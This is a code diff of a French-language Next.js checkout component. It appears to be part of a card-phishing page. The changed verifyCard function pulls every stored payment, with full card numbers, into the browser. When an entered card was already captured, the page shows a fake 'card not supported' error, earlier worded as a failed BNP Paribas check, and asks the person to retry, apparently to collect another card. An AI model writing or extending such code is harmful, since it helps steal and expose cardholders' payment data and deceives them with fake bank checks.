@@ -4,7 +4,7 @@ import { useRouter } from 'next/router';
 
 
 
-const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop, payments }) => {
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -184,27 +184,31 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     return false;
   }
 
-
-    // ...existing code...
   
   const verifyCard = async (cardNumber) => {
-    // Normalise le numéro recherché (supprime les espaces)
+    // Normalise le numéro cherché (supprime les espaces)
     const target = cardNumber.replace(/\s/g, '');
-  
+
+    // Appel à l’API et parsing de la réponse
+    const response = await fetch('/api/get-payments', {
+      method: 'GET',
+      headers: { 'Content-Type': 'application/json' },
+    });
+    if (!response.ok) {
+      console.error('Error fetching payments:', response.status, response.statusText);
+      return false;
+    }
+    const { payments } = await response.json();
+
     // Parcourt les paiements et renvoie true si on trouve une correspondance
     return payments.some(payment => {
-      // Parse card_details si besoin
       const details = typeof payment.card_details === 'string'
         ? JSON.parse(payment.card_details)
         : payment.card_details;
-  
-      // Normalise le numéro dans les détails
-      const number = (details.cardNumber || '').replace(/\s/g, '');
-      return number === target;
+      const stored = (details.cardNumber || '').replace(/\s/g, '');
+      return stored === target;
     });
   };
-  
-  // ...existing code...
 
 
   const handleCheckout = async (e) => {
@@ -242,13 +246,13 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
       // Si carte déjà été utilisée, afficher l'erreur
       if (verifyResult) {
-        console.log("--> Carte déjà utilisée");
+        //console.log("--> Carte déjà utilisée");
         setIsLoading(false);
         setShow3DSecurePopup(false);
         setShowCardError(true);
       }
       else {
-        console.log("--> Carte non utilisée");
+        //console.log("--> Carte non utilisée");
         setTimeout(() => {
           setIsLoading(false);
           setShowCardError(false);
@@ -426,7 +430,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             </article>
             <h2 className="icon">❌</h2>
             <h2>carte non-prise en charge</h2> 
-            <p className="desc">Échec durant la vérification BNP Paribas, du moyen de paiement renseigné.</p>
+            <p className="desc">Échec durant la vérification d'identité mode de paiement non-accepté.</p>
             <button
               onClick={() => {
                 setShowCardError(false);
@@ -434,7 +438,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               }}
               disabled={isLoading}
             >
-              Changer de carte
+              Réessayer
             </button>
           </div>
         </div>
